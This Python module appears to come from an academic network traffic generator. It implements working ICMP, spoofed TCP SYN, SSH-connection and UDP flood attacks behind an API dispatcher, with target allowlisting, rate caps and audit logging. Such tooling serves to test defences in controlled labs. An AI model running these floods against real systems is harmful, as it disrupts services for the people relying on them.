#
# Authors:
#   Anikait Nair - anikaitm752@gmail.com
#   Dr. Swetha P - swethap@pes.edu
#   Dr. Prasad B Honnavalli - prasadbh@pes.edu
#
# Contributors:
#   ISFCR - office.isfcr@pes.edu
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# SPDX-License-Identifier: Apache-2.0
#
"""
malicious_profiles.py
=====================
Malicious traffic simulation profiles for ATG.

Design rules
------------
* Every flood function is SYNCHRONOUS (runs in a thread-pool worker).
* dispatch_malicious_profile() is an ASYNC coroutine that offloads the
  blocking flood call to asyncio's default ThreadPoolExecutor so the
  FastAPI event-loop is never blocked.
* Returns a job_id string so the caller can track the run.
* intensity → pps mapping:  low=100  medium=500  high=2000
  (both values are capped by _MAX_PPS / _MAX_DURATION from the .env)
"""

import asyncio
import ipaddress
import logging
import os
import random
import secrets
import socket
import struct
import time
import uuid
from typing import Optional

from scapy.all import IP, TCP, UDP, Raw, send as scapy_send  # type: ignore

from level0.job_state import JobState

logger = logging.getLogger(__name__)

# ── Environment caps ───────────────────────────────────────────────────────────
_MAX_PPS      = int(os.environ.get("ATG_MAX_PPS", "10000"))
_MAX_DURATION = int(os.environ.get("ATG_MAX_DURATION", "60"))
_ALLOWED_RAW  = os.environ.get("ATG_ALLOWED_TARGETS", "")
_ALLOWLIST: list[str] = [t.strip() for t in _ALLOWED_RAW.split(",") if t.strip()]

# ── Private network ranges ─────────────────────────────────────────────────────
_RFC1918 = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

# ── Intensity → packets-per-second mapping ─────────────────────────────────────
_INTENSITY_PPS: dict[str, int] = {
    "low":    100,
    "medium": 500,
    "high":   2000,
}

# ── Default ports per attack type ─────────────────────────────────────────────
_DEFAULT_PORT: dict[str, int] = {
    "tcp_syn_flood": 80,
    "udp_flood":     53,
    "ssh_flood":     22,
    "icmp_flood":    0,
}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _validate_target(destination: str) -> None:
    """Raise ValueError if destination is not allowed."""
    if destination in _ALLOWLIST:
        return
    try:
        addr = ipaddress.ip_address(destination)
        if any(addr in net for net in _RFC1918):
            return
    except ValueError:
        pass
    raise ValueError(
        f"Destination '{destination}' is not in ATG_ALLOWED_TARGETS "
        "and is not an RFC1918 private address. "
        "Add it to ATG_ALLOWED_TARGETS in your .env to proceed."
    )


def _cap(pps: int, duration: float) -> tuple[int, float]:
    """Enforce ATG_MAX_PPS and ATG_MAX_DURATION ceilings."""
    return min(pps, _MAX_PPS), min(duration, _MAX_DURATION)


def _audit(profile: str, destination: str, pps: int, duration: float) -> None:
    logger.warning(
        "MALICIOUS EXECUTION — profile=%s  dst=%s  pps=%d  duration=%.1fs",
        profile, destination, pps, duration,
    )


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s  = (s >> 16) + (s & 0xFFFF)
    return ~s & 0xFFFF


# ── Flood implementations (all SYNCHRONOUS) ───────────────────────────────────

def send_icmp_flood(
    destination:  str,
    pps:          int,
    duration_sec: float,
    job_state:    Optional[JobState] = None,
    packet_size:  int = 64,
) -> None:
    """Send raw ICMP echo-request flood. Requires root / Administrator."""
    _validate_target(destination)
    pps, duration_sec = _cap(pps, duration_sec)
    _audit("icmp_flood", destination, pps, duration_sec)

    count    = int(pps * duration_sec)
    interval = 1.0 / pps if pps > 0 else 0.0
    payload  = b"X" * max(0, packet_size - 28)
    pid      = os.getpid() & 0xFFFF

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        logger.error("ICMP flood requires Administrator / root privileges.")
        return

    try:
        for i in range(count):
            if job_state and job_state.should_stop():
                break
            # Build ICMP echo-request with correct checksum
            header  = struct.pack("!BBHHH", 8, 0, 0, pid, i)
            chk     = _checksum(header + payload)
            header  = struct.pack("!BBHHH", 8, 0, chk, pid, i)
            try:
                sock.sendto(header + payload, (destination, 0))
                if job_state:
                    job_state.increment_attempt()
                    job_state.increment_sent()
                    job_state.add_bytes_sent(packet_size)
            except OSError:
                if job_state:
                    job_state.increment_attempt()
                    job_state.increment_error()
            if interval:
                time.sleep(interval)
    finally:
        sock.close()


def send_tcp_syn_flood(
    destination:  str,
    port:         int,
    pps:          int,
    duration_sec: float,
    job_state:    Optional[JobState] = None,
    packet_size:  int = 60,
) -> None:
    """Send spoofed TCP SYN flood via Scapy. Requires root / Administrator."""
    _validate_target(destination)
    pps, duration_sec = _cap(pps, duration_sec)
    _audit("tcp_syn_flood", destination, pps, duration_sec)

    count    = int(pps * duration_sec)
    interval = 1.0 / pps if pps > 0 else 0.0
    payload  = b"S" * max(0, packet_size - 40)

    for i in range(count):
        if job_state and job_state.should_stop():
            break
        src_ip = (
            f"{random.randint(1, 254)}.{random.randint(0, 255)}"
            f".{random.randint(0, 255)}.{random.randint(1, 254)}"
        )
        try:
            pkt = (
                IP(src=src_ip, dst=destination)
                / TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="S",
                    seq=random.randint(0, 2**32 - 1),
                )
                / Raw(load=payload)
            )
            scapy_send(pkt, verbose=False)
            if job_state:
                job_state.increment_attempt()
                job_state.increment_sent()
                job_state.add_bytes_sent(packet_size)
        except Exception:
            if job_state:
                job_state.increment_attempt()
                job_state.increment_error()
        if interval:
            time.sleep(interval)


def send_ssh_flood(
    destination:  str,
    pps:          int,
    duration_sec: float,
    job_state:    Optional[JobState] = None,
) -> None:
    """Open rapid TCP connections to port 22 and send SSH banner."""
    _validate_target(destination)
    pps, duration_sec = _cap(pps, duration_sec)
    _audit("ssh_flood", destination, pps, duration_sec)

    # SSH flood is connection-based; cap at 500 connections total
    count    = min(int(pps * duration_sec), 500)
    interval = 1.0 / pps if pps > 0 else 0.0
    banner   = b"SSH-2.0-OpenSSH_8.9\r\n"

    for _ in range(count):
        if job_state and job_state.should_stop():
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((destination, 22))
            sock.sendall(banner)
            sock.close()
            if job_state:
                job_state.increment_attempt()
                job_state.increment_sent()
                job_state.add_bytes_sent(len(banner))
        except Exception:
            if job_state:
                job_state.increment_attempt()
                job_state.increment_error()
        if interval:
            time.sleep(interval)


def send_udp_flood(
    destination:  str,
    port:         int,
    pps:          int,
    duration_sec: float,
    job_state:    Optional[JobState] = None,
    packet_size:  int = 1024,
) -> None:
    """Send high-volume UDP packets to a target port."""
    _validate_target(destination)
    pps, duration_sec = _cap(pps, duration_sec)
    _audit("udp_flood", destination, pps, duration_sec)

    count    = int(pps * duration_sec)
    interval = 1.0 / pps if pps > 0 else 0.0
    payload  = os.urandom(min(packet_size, 1400))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except OSError as exc:
        logger.error("UDP socket creation failed: %s", exc)
        return

    try:
        for _ in range(count):
            if job_state and job_state.should_stop():
                break
            try:
                sock.sendto(payload, (destination, port))
                if job_state:
                    job_state.increment_attempt()
                    job_state.increment_sent()
                    job_state.add_bytes_sent(len(payload))
            except OSError:
                if job_state:
                    job_state.increment_attempt()
                    job_state.increment_error()
            if interval:
                time.sleep(interval)
    finally:
        sock.close()


# ── Registry (must be defined BEFORE dispatch_malicious_profile) ───────────────

MALICIOUS_REGISTRY: dict[str, object] = {
    "icmp_flood":    send_icmp_flood,
    "tcp_syn_flood": send_tcp_syn_flood,
    "ssh_flood":     send_ssh_flood,
    "udp_flood":     send_udp_flood,
}


# ── Async dispatcher (called by api.py) ────────────────────────────────────────

async def dispatch_malicious_profile(
    attack_type:      str,
    target_ip:        str,
    duration_seconds: int   = 10,
    intensity:        str   = "low",
    port:             int   = 0,
) -> str:
    """
    Async entry point used by api.py.

    Parameters
    ----------
    attack_type      : key in MALICIOUS_REGISTRY
    target_ip        : validated destination IP / hostname
    duration_seconds : how long to run (capped by ATG_MAX_DURATION)
    intensity        : "low" | "medium" | "high"  →  mapped to pps
    port             : override destination port (0 = use default for attack type)

    Returns
    -------
    job_id : str  — unique identifier for this malicious run
    """
    handler = MALICIOUS_REGISTRY.get(attack_type.lower())
    if not handler:
        raise ValueError(
            f"Unknown attack type '{attack_type}'. "
            f"Valid types: {list(MALICIOUS_REGISTRY.keys())}"
        )

    pps = _INTENSITY_PPS.get(intensity.lower(), _INTENSITY_PPS["low"])
    effective_port = port if port > 0 else _DEFAULT_PORT.get(attack_type, 80)

    job_id    = f"mal-{uuid.uuid4().hex[:12]}"
    job_state = JobState(job_id, attack_type, target_ip)

    loop = asyncio.get_event_loop()

    # Run the blocking flood in a thread-pool worker so the event loop
    # is never blocked.
    if attack_type in ("tcp_syn_flood", "udp_flood"):
        await loop.run_in_executor(
            None,
            lambda: handler(  # type: ignore[operator]
                target_ip,
                effective_port,
                pps,
                float(duration_seconds),
                job_state,
            ),
        )
    else:
        await loop.run_in_executor(
            None,
            lambda: handler(  # type: ignore[operator]
                target_ip,
                pps,
                float(duration_seconds),
                job_state,
            ),
        )

    job_state.set_state("COMPLETED")
    logger.info("Malicious run completed — job_id=%s  attack=%s", job_id, attack_type)
    return job_id